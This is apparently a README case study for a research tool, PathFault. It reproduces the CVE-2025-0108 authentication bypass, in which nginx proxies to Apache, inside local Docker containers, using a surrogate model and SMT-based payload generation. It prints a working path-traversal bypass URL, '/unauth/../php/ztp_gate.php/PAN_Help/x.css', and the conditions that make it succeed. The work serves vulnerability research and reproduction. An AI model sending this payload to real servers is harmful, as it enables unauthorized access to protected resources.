# Generating Real-World Exploit Payloads - Authentication Bypass: CVE-2025-0108

This document provides a step-by-step guide for modeling and validating an exploit payload for **CVE-2025-0108** using the PathFault framework.

## About CVE-2025-0108

**CVE-2025-0108** is an authentication bypass vulnerability triggered by inconsistent URL parsing between multiple web components, specifically when **nginx** is used as a reverse proxy in front of **Apache HTTP Server**. The issue arises due to a discrepancy in how each server interprets encoded path traversal sequences such as `%2F..%2F`. An attacker can craft a request that appears safe to the proxy (nginx) but gets resolved to a sensitive internal resource by the backend (Apache), effectively bypassing access control mechanisms.

## Create Mimic Environment

The vulnerable configuration involves nginx as a proxy and Apache HTTP Server as the backend. Therefore, we need to build a **mimic environment** using both components to replicate the parsing inconsistency.

This repository provides Docker-based **presets** for both `nginx` and `apachehttpserver`. These presets are used to instantiate realistic server environments during the testing phase.

### Step 1: Copy Preset Files

To use the provided preset files, copy them into the toolâ€™s `web_app_components` directory:

```bash
cp -r ./presets/web_app_components/apachehttpserver ./pathfault/modules/utilities/mimic_environment_creator/web_app_components
cp -r ./presets/web_app_components/nginx ./pathfault/modules/utilities/mimic_environment_creator/web_app_components
cp -r ./presets/web_app_components/tmpserver ./pathfault/modules/utilities/mimic_environment_creator/web_app_components
```

Also, if the `logs` file is already exists, delete it.
```bash
sudo rm -r ./pathfault/results/mimic_environment_creator/logs
```

### Step 2: Generate Docker Compose Configuration

Generate the `docker-compose.yml` and related configuration using the following command:

```bash
python manage.py utilities mimic-environment-creator workflows create-mimic-environment \
  --web-app-config-path ./case_study/authentication_bypass_cve-2025-0108/create_mimic_environment_config.json
```

### Step 3: Launch the Mimic Environment

Start the containers using Docker Compose:

```bash
docker compose -f ./pathfault/results/mimic_environment_creator/docker-compose.yml up
```

At this point, the mimic environment will be running with both `nginx` and `apachehttpserver` configured according to the vulnerability scenario. All subsequent analysis will be performed against this live environment.

---

## Detect Inconsistency

When generating the `docker-compose.yml`, a corresponding `port_map.json` is also created. This file maps each web application component (e.g., `nginx`, `apachehttpserver`) to its respective container and exposed port.

We use this mapping to automatically detect inconsistencies in HTTP path interpretation across servers. The following command runs the full **inconsistency detection workflow**, including configuration, traffic replay, log parsing, and result analysis:

```bash
python manage.py core inconsistency-detector workflows detect-inconsistency \
  --port-map-path ./pathfault/results/mimic_environment_creator/port_map.json
```

This step performs the following:

1. **Generates configuration** files for the inconsistency detector using the port map.
2. **Sends pre-defined requests** to each container to check for inconsistencies in path handling.
3. **Parses PCAP traffic logs** into structured CSV format.
4. **Analyzes inconsistencies**, identifying which components interpreted the same payload differently.

The final output includes:

- ðŸ§¾ `inconsistency_detector_config`: Generated configuration files for the test.
- ðŸ“ `logs/`: PCAP traces of all requests and responses.
- ðŸ“Š `converted_logs.csv`: Parsed request-response summary (one row per attempt).
- ðŸ“ˆ `inconsistency_analysis_result.json`: A structured JSON file summarizing observed discrepancies.

## Build Surrogate Model

With the inconsistency analysis result obtained in the previous step, we can now construct a surrogate model that reflects how a sequence of web componentsâ€”specifically `nginx` followed by `apachehttpserver`â€”interprets and transforms URL paths.

Run the following command to generate a surrogate model Python file:

```bash
python manage.py core surrogate-model-builder services build-surrogate-model \
  --json ./pathfault/results/inconsistency_detector/inconsistency_analysis_result.json \
  --server-list nginx,apachehttpserver \
  --output ./case_study/authentication_bypass_cve-2025-0108/presets/surrogate_model/surrogate_model_nginx_apachehttpserver.py
```

This will produce a Python file representing the surrogate model based on the specified server sequence and detected inconsistencies.  
You can find the resulting model here:

[`case_study/authentication_bypass_cve-2025-0108/presets/surrogate_model/surrogate_model_nginx_apachehttpserver.py`](./case_study/authentication_bypass_cve-2025-0108/presets/surrogate_model/surrogate_model_nginx_apachehttpserver.py)

To create a copy of this model for the extended sequence including `apachehttpserverinternal`, run the following command:

```bash
cp ./case_study/authentication_bypass_cve-2025-0108/presets/surrogate_model/surrogate_model_nginx_apachehttpserver.py \
   ./case_study/authentication_bypass_cve-2025-0108/presets/surrogate_model/surrogate_model_nginx_apachehttpserver_apachehttpserverinternal.py
```

After copying, modify the copied file (`surrogate_model_nginx_apachehttpserver_apachehttpserverinternal.py`) to include the `apachehttpserverinternal` component. Duplicate the `apachehttpserver` component definition and rename it to `apachehttpserverinternal`, adding the following conditions:

```python
apachehttpserverinternal = Server(
    name="apachehttpserverinternal",
    condition_list=[
        ContainsType("\x00", not_condition=True),
        ContainsType("\x04", not_condition=True),
        ContainsType("\x01", not_condition=True),
        ContainsType("\x03", not_condition=True),
        ContainsType("\x05", not_condition=True),
        ContainsType("\x02", not_condition=True),
        ContainsType("\x06", not_condition=True),
        ContainsType("\n", not_condition=True),
        ContainsType("\x08", not_condition=True),
        ContainsType("\t", not_condition=True),
        ContainsType("\x07", not_condition=True),
        ContainsType("\x0b", not_condition=True),
    ],
    # Copy other attributes from apachehttpserver as needed
)
```

Then, update the return statement in the model to include the new component:

```python
return [nginx, apachehttpserver, apachehttpserverinternal]
```

This modified file will serve as the extended surrogate model.

## Generate Exploit Payload

### Step 1: Setting the Pentester's Objective in the Surrogate Model

CVE-2025-0108 requires an **internal redirect** behavior by the `apachehttpserver`.  
To capture this behavior accurately, we use the extended surrogate model with the `apachehttpserverinternal` component, as reflected in the modified file:

[`case_study/authentication_bypass_cve-2025-0108/presets/surrogate_model/surrogate_model_nginx_apachehttpserver_apachehttpserverinternal.py`](./case_study/authentication_bypass_cve-2025-0108/presets/surrogate_model/surrogate_model_nginx_apachehttpserver_apachehttpserverinternal.py)

Additionally, the vulnerability is triggered when the frontend server (`nginx`) does not enforce authentication for paths that begin with `/unauth/`.  
To reflect this logic in the surrogate model, we define the following conditions in the `nginx` component:

```python
target_pre_condition_list=[
    PrefixType("/unauth/")
],
target_post_condition_list=[
    PrefixType("/unauth/")
],
```

Furthermore, if a request reaches the backend `apachehttpserver` with a path ending in `/PAN_Help/x.css`, it will implicitly append `.gz` to the path.  
This transformation must be encoded as an **essential transformation** in the model:

```python
essential_transformation_list=[
    Transformation(
        name="add_gz",
        transformation_type=AddSuffixTransformation(".gz"),
        conditions=[SuffixType("/PAN_Help/x.css")]
    )
],
```

This revised surrogate model is stored in:

[`case_study/authentication_bypass_cve-2025-0108/presets/surrogate_model/surrogate_model_nginx_apachehttpserver_apachehttpserverinternal.py`](./case_study/authentication_bypass_cve-2025-0108/presets/surrogate_model/surrogate_model_nginx_apachehttpserver_apachehttpserverinternal.py)

### Step 2: Generating Validated Exploit Payloads

To generate and validate real-world exploit payloads based on the surrogate model, run the following command:

```bash
python manage.py core exploit-generator workflows generate-validated-exploit-payloads \
  --gen-target-path '/php/ztp_gate.php/PAN_Help/x.css.gz' \
  --gen-surrogate-model ./case_study/authentication_bypass_cve-2025-0108/presets/surrogate_model/surrogate_model_nginx_apachehttpserver_apachehttpserverinternal.py \
  --gen-smt-timeout 10 \
  --gen-max-workers 6 \
  --gen-max-transformation-num 1
```

Each CLI flag serves the following purpose:

- `--gen-target-path`: The backend resource path that the attacker is trying to reach.
- `--gen-surrogate-model`: Path to the surrogate model capturing the parser discrepancy sequence.
- `--gen-smt-timeout`: SMT solver timeout (in seconds) for each payload generation task.
- `--gen-max-workers`: Number of parallel workers used during the exploit search.
- `--gen-max-transformation-num`: Maximum number of transformations to apply per server.

This workflow performs two main phases:

1. **Payload Generation**  
   It uses the SMT solver to explore possible encodings and transformations that will bypass intermediate components and reach the target path.
2. **Payload Validation**  
   Each generated payload is then checked against the surrogate model to confirm whether it can truly exploit the parser discrepancy under the modeled conditions.

Once the command finishes, two key output files are created:

- `exploit_generation_output.json`: SMT solving metadata and intermediate results.
- `exploit_validation_output.json`: Final validated payloads that satisfy the specified attacker objectives.

The validated exploit payloads can be found in the JSON file under the key:

```json
"candidate_summary": {
  "successful_candidates": [
    "/unauth/../php/ztp_gate.php/PAN_Help/x.css"
    ...
  ]
}
```

These are the actual URLs that were confirmed to reach the backend despite the presence of the front-end filtering logic â€” proving successful authentication bypass.

---

## Reproducing Results from the Paper

Before running the experiment, ensure the final surrogate model is copied to the experiment directory:

```bash
mkdir -p ./case_study/authentication_bypass_cve-2025-0108/presets/surrogate_model_for_experiment && \
cp ./case_study/authentication_bypass_cve-2025-0108/presets/surrogate_model/surrogate_model_nginx_apachehttpserver_apachehttpserverinternal.py \
   ./case_study/authentication_bypass_cve-2025-0108/presets/surrogate_model_for_experiment/surrogate_model_nginx_apachehttpserver_apachehttpserverinternal.py
```

This step is required to make the surrogate model with `apachehttpserverinternal` available for the experiment.

Then, run the following command to reproduce the experimental results presented in the paper using the same configuration and toolchain:

```bash
python case_study/tools/generate_validated_exploit_payloads_for_experiment.py \
  --rules ./case_study/authentication_bypass_cve-2025-0108/experiment_config_cve.json \
  --iterations 10 \
  --timeout 10 \
  --max-transformation 1 \
  --max-workers 6
```

Each option controls the following:

- `--rules`: Path to the JSON configuration listing case studies and surrogate models.
- `--iterations`: Number of times each surrogate model should be executed.
- `--timeout`: Timeout (in seconds) for each SMT solving attempt.
- `--max-transformation`: Maximum number of transformations allowed per request.
- `--max-workers`: Number of parallel SMT solver processes.

Upon completion, the tool generates per-run JSON files under the directories:
- `./case_study/generation_results/`
- `./case_study/validation_results/`

To analyze these outputs and compute per-model performance metrics, run:

```bash
python ./case_study/tools/analysis_generation_and_validation_results_for_experiment.py \
  --config ./case_study/authentication_bypass_cve-2025-0108/analysis_config_cve.json \
  --depth 3 \
  --output ./case_study/analysis_results/authentication_bypass_cve-2025-0108.csv
```

> âš ï¸ **Important Notes on Analysis Scope**
>
> The `--config` argument is used to specify the *target payload* for each case study, allowing the tool to perform enhanced analysis such as checking whether the desired exploit payload was successfully generated and validated.
>
> However, the tool will analyze **all files** under the following directories:
>
> - `./case_study/generation_results/`
> - `./case_study/validation_results/`
>
> Therefore, to ensure that the CSV includes only metrics relevant to the current case study (e.g., ChatGPT Account Takeover), you **must manually remove** or relocate unrelated experiment results from these directories **before** running the analysis.
>
> This design supports bulk analysis but places responsibility on the user to manage directory contents appropriately for scoped evaluation.

Each row corresponds to a specific surrogate model and includes the following fields:

* **project**: The name of the case study.
* **surrogate**: The surrogate model filename.
* **target_payload**: The attacker-specified target path.
* **gen_component1**, **gen_component2**, ...: The sequence of components (e.g., nginx â†’ apachehttpserver).
* **gen_file_count**: Number of generation trials.
* **gen_total_avg**: Average total generation time per trial.
* **gen_smt_solving_info_count**: Total number of SMT solving attempts.
* **gen_avg_success** / **gen_avg_failed**: Average count of successful or failed SMT attempts.
* **gen_avg_final_transformed_urls**: Average number of final URLs generated.
* **gen_stepX**: Average duration for each internal step in the generation pipeline.
* **gen_max_memory_MB**, **gen_cpu_user_time_sec**, etc.: Average resource usage during generation.
* **val_file_count**: Number of validation attempts.
* **val_avg_execution_time**: Average time taken per validation.
* **val_avg_successful** / **val_avg_removed**: Average number of valid vs. filtered payloads.
* **val_max_successful**, etc.: Maximum counts observed during validation.
* **val_contain_payload_success_ratio**: Ratio of validations where the exact target payload appeared.
* **val_payload_exist_success_ratio**: Ratio of validations that produced at least one valid payload.
* **total_avg_combined**: Combined generation + validation duration.
* **combined_cpu_user_time_sec**, etc.: Aggregate resource usage across both phases.

Also, to extract all unique exploit payloads observed across validation results:

```bash
python case_study/tools/get_unique_exploit_payloads_for_experiment.py \
  ./case_study/validation_results/authentication_bypass_cve-2025-0108 \
  --output ./case_study/unique_payloads/unique_payloads_cve-2025-0108.json
```

All quantitative results and data reported in the paper were derived using this workflow.  
The final processed artifacts are available under:  
[`./case_study/authentication_bypass_cve-2025-0108/data/`](./case_study/authentication_bypass_cve-2025-0108/data/)

